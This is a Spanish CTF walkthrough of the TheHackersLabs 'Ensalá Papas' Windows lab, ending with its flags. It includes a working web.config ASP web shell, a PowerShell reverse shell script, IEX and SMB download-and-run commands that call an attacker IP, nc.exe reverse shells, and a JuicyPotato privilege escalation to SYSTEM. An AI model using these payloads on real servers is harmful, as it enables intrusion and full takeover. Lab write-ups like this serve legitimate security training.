---
icon: flag
---

# Ensalá Papas (Windows) TheHackersLabs (Principiante)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-19 14:03 EDT
Nmap scan report for 192.168.28.4
Host is up (0.00032s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:7D:13:F9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: -2s
| smb2-time: 
|   date: 2025-03-19T18:04:32
|_  start_date: 2025-03-19T17:50:15
|_nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7d:13:f9 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.21 seconds
```

Vemos bastantes cosas interesantes, de primeras si entramos en el puerto `80` veremos una pagina alojada en `IIS7` sin ninguna pagina como tal alojada, esta por defecto, por lo que no veremos mucho:

<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

Tambien vemos un `SMB`, pero vemos que es un `SMBv2` por lo que no tiene la vulnerabilidad del `EternalBlue`, pero si intentamos enumerar los recursos compartidos del servidor mediante el `SMB` pero veremos que no nos muestra nada por lo menos de forma `anonima`, por lo que vamos a realizar un poco de `fuzzing` hacia el servidor `ISS7`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x aspx,asp,html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.28.4/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,aspx,asp,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3a%2f%2fwww.aspx (Status: 400) [Size: 20]
/http%3a.aspx         (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/*http%3a.aspx        (Status: 400) [Size: 20]
/http%3a%2f%2fyoutube.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fblogs.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fblog.aspx (Status: 400) [Size: 20]
/**http%3a%2f%2fwww.aspx (Status: 400) [Size: 20]
/s%26p.aspx           (Status: 400) [Size: 20]
/%3frid%3d2671.aspx   (Status: 400) [Size: 20]
/devinmoore*.aspx     (Status: 400) [Size: 20]
/children%2527s_tent.aspx (Status: 400) [Size: 20]
/how_to%2e%2e%2e.aspx (Status: 400) [Size: 20]
/wanted%2e%2e%2e.aspx (Status: 400) [Size: 20]
/200109*.aspx         (Status: 400) [Size: 20]
/*sa_.aspx            (Status: 400) [Size: 20]
/*dc_.aspx            (Status: 400) [Size: 20]
/help%2523drupal.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fcommunity.aspx (Status: 400) [Size: 20]
/chamillionaire%20%26%20paul%20wall-%20get%20ya%20mind%20correct.aspx (Status: 400) [Size: 20]
/clinton%20sparks%20%26%20diddy%20-%20dont%20call%20it%20a%20comeback%28ruzty%29.aspx (Status: 400) [Size: 20]
/dj%20haze%20%26%20the%20game%20-%20new%20blood%20series%20pt.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fradar.aspx (Status: 400) [Size: 20]
/q%26a2.aspx          (Status: 400) [Size: 20]
/login%3f.aspx        (Status: 400) [Size: 20]
/shakira%20oral%20fixation%201%20%26%202.aspx (Status: 400) [Size: 20]
/%22britney%20spears%22.aspx (Status: 500) [Size: 3276]
/%22james%20kim%22.aspx (Status: 500) [Size: 3276]
/%22julie%20roehm%22.aspx (Status: 500) [Size: 3276]
/http%3a%2f%2fjeremiahgrossman.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fweblog.aspx (Status: 400) [Size: 20]
/http%3a%2f%2fswik.aspx (Status: 400) [Size: 20]
Progress: 1245858 / 1245864 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias rutas, pero entre ellas la que nos interesa es la del `200 OK` que es el archivo llamado `/zoc.aspx`, si entramos en el veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Vemos que podemos subir un archivo, por lo que vamos a intentar subir un `.aspx` de forma que se pueda ejecutar codigo remoto hacia el servidor con una interfaz en el archivo para que se vea todas las salidas de comandos de forma comoda y de ahi poder entrar a la maquina con una `reverse shell`.

Pero si intentamos subir el archivo nos dara error ya que esta validando el tipo de archivo que se esta subiendo, pero si inspeccionamos la pagina veremos el siguiente comentario:

```html
<!-- /Subiditosdetono -->
```

Si entramos en el como directorio web, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un archivo `web.config` que si entramos veremos que nos da un error ya que el archivo no esta, pero podemos crear un archivo llamado asi y meter la configuracion para que podamos ejecutar comandos de forma remota.

Tras investigar mucho encontre en la pagina de `HackTricks` un ejemplo de `web.config` que contiene lo siguiente:

> web.config

```aspx
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write("<!-"&"-") %>
-->
```

URL = [web.config Example Info](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

URL = [Download web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Ahora lo subiremos desde el archivo `/zoc.aspx` y nos pondra lo siguiente:

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Ahora si nos vamos a la siguiente ruta para cargar el archivo `web.config` con nuestro `payload`.

```
URL = http://<IP>/Subiditosdetono/web.config
```

Si entramos ahi veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

Vemos que el archivo esta cargando de forma correcta, ahora vamos a probar a meter un comando, por ejemplo `whoami` y veremos esto:

```
win-4qu3qnhnk7e\info
```

Vemos que esta funcionando de forma correcta, por lo que vamos a ingresar el siguiente `payload` para obtener una `shell` con la maquina victima.

## Escalate user win-4qu3qnhnk7e\info

### Opcion 1 (reverse shell .ps1)

Podemos crear este codigo en `.ps1`:

```shell
nano shell.ps1
```

Dentro del nano:

```powershell
$LHOST = "<IP>"  # Cambia esto por tu IP
$LPORT = <PORT>            # Cambia esto por el puerto de escucha

$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

do {
    $stream.Read($buffer, 0, $buffer.Length) | Out-Null
    $cmd = $encoding.GetString($buffer).Trim()
    if ($cmd -eq "exit") { break }
    $output = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
    $response = $encoding.GetBytes($output + "`nPS > ")
    $stream.Write($response, 0, $response.Length)
    $stream.Flush()
} while ($true)

$client.Close()
```

Esto lo guardamos y abriremos `metasploit` pata ponernos a la escucha.

```shell
msfconsole -q
```

Ahora lo configuraremos de la siguiente forma:

```shell
use exploit/multi/handler
set payload windows/powershell_reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```

Abrimos un servidor de `python3` en nuestro `host` para que obtenga el archivo `shell.ps1` y lo ejecute.

```shell
python3 -m http.server 8000
```

Ahora vamos a la `web.config` y pondremos el siguiente comando:

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8000/shell.ps1')"
```

Si vamos a donde tenemos la escucha de `metasploit` veremos lo siguiente:

```
[*] Started reverse TCP handler on 192.168.28.5:7777 
[*] Powershell session session 1 opened (192.168.28.5:7777 -> 192.168.28.4:49160) at 2025-03-20 11:13:00 -0400


PS > whoami
win-4qu3qnhnk7e\info
```

### Opcion 2 (Reverse Shell SMB) `RECOMENDADO!!`

Tambien podemos generarnos una `reverse shell` mediante un `servidor` de `SMB` abierto desde nuestro `host`, para que desde el `web.config` ejecutar un comando para ejecutar un `nc.exe` desde nuestro servidor de `SMB`.

Primero tendremos que copiarnos el ejecutable `nc.exe` a nuestro directorio actual.

```shell
cp /usr/share/windows-binaries/nc.exe .
```

Una vez copiado nuestro binario de `netcat` vamos abrirnos el servidor de `SMB`:

```shell
impacket-smbserver -smb2support kali .
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

Ahora desde la pagina de `web.config` ejecutaremos lo siguiente:

```powershell
\\<IP_ATTACKER>\kali\nc.exe -e cmd <IP_ATTACKER> <PORT>
```

Con esto lo que haremos sera conectarnos a nuestro servidor de `SMB` para ejecutar el binario `nc.exe` y seguidamente estamos estableciendo una conexion a dicho `puerto` e `IP`.

Antes de enviarlo nos tendremos que poner a la escucha de la siguiente forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos ese `payload` en el `web.config` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49160
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

c:\windows\system32\inetsrv> whoami
win-4qu3qnhnk7e\info
```

Veremos que ha funcionado por lo que leeremos la `flag` del usuario.

> user.txt

```
uigsg5sdfdfbv5b6sad98vcdf
```

## Escalate Privileges

Vamos a ver que privilegios tenemos:

```powershell
whoami /priv
```

Info:

```
INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado       
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado
```

Vemos que `SeImpersonatePrivilege` esta `habilitado`.

Es muy similar a `SeImpersonatePrivilege`, utilizará el mismo método para obtener un token privilegiado. Luego, este privilegio permite asignar un token primario a un proceso nuevo/suspendido. Con el `token` de suplantación privilegiado puedes derivar un token primario `(DuplicateTokenEx)`. Con el `token`, puedes crear un nuevo proceso con `'CreateProcessAsUser'` o crear un proceso suspendido y establecer el token (en general, no puedes modificar el token primario de un proceso en ejecución).

URL = [Info SeImpersonatePrivilege](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html?highlight=SeImpersonatePrivilege#seimpersonateprivilege)

Vamos a descargarnos en nuestro `hosts` el binario malicioso llamado `JuicyPotato.exe`:

URL = [Download JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)

Ahora nos lo vamos a pasar a la maquina victima ejecutando este comando desde la maquina victima:

Antes abriremos un servidor de `python3` para que se lo pueda descargar:

```shell
python3 -m http.server 8000
```

Y ahora si podremos ejecutar el siguiente comando:

```powershell
mkdir C:\Temp
cd C:\Temp

powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP_ATTACKER>:8000/JuicyPotato.exe', 'C:\Temp\JuicyPotato.exe')"
```

Si esto fallara podremos hacerlo directamente desde el `SMB` poniendo lo siguiente:

```powershell
\\<IP_ATTACKER>\kali\JuicyPotato.exe
```

Quedando algo asi el `payload`:

```powershell
\\<IP_ATTACKER>\kali\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
```

Pero si tuvieramos el binario directamente podremos hacerlo de la siguiente forma:

```powershell
JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
```

Info:

```
JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/C \\192.168.28.5\kali\nc.exe -e cmd.exe 192.168.28.5 5555" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
```

Vemos que nos esta dando un error relacionado con las `CLSIDs` por lo que vamos a utilizar otras genericas que suelen funcionar en un `Windows Server 2008`:

```
===================LISTA_CLSID====================

{4991d34b-80a1-4291-83b6-3328366b9097} -> ERROR
{e60687f7-01a1-40aa-86ac-db1cbf673334} -> CORRECTA
{ba126ad1-2166-11d1-b1d0-00805fc1270e} -> NO TESTEADA

==================================================
```

Si por ejemplo probamos con esta generica `{e60687f7-01a1-40aa-86ac-db1cbf673334}` veremos que si nos funciona:

Pero antes nos pondremos a la escucha con el puerto que especifiquemos en la herramienta `JuicyPotato.exe`.

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos de nuevo con el nuevo `CLSID` de la siguiente manera:

```powershell
JuicyPotato.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p c:\windows\system32\cmd.exe -a "/C \\<IP_ATTACKER>\kali\nc.exe -e cmd.exe <IP_ATTACKER> <PORT>" -t *
```

Info:

```
JuicyPotato -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p c:\windows\system32\cmd.exe -a "/C \\192.168.28.5\kali\nc.exe -e cmd.exe 192.168.28.5 5555" -t *
Testing {e60687f7-01a1-40aa-86ac-db1cbf673334} 1337
....
[+] authresult 0
{e60687f7-01a1-40aa-86ac-db1cbf673334};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Con esto veremos que ha funcionado, por lo que si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 5555 ...
connect to [192.168.28.5] from (UNKNOWN) [192.168.28.4] 49178
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Windows\system32>whoami
nt authority\system
```

Vemos que seremos ya `nt authority\system` por lo que habremos terminado la maquina, ahora leeremos la `flag` del `administrador`.

> root.txt

```
jbeaf7gvser79aw6vvbf78wrgv
```
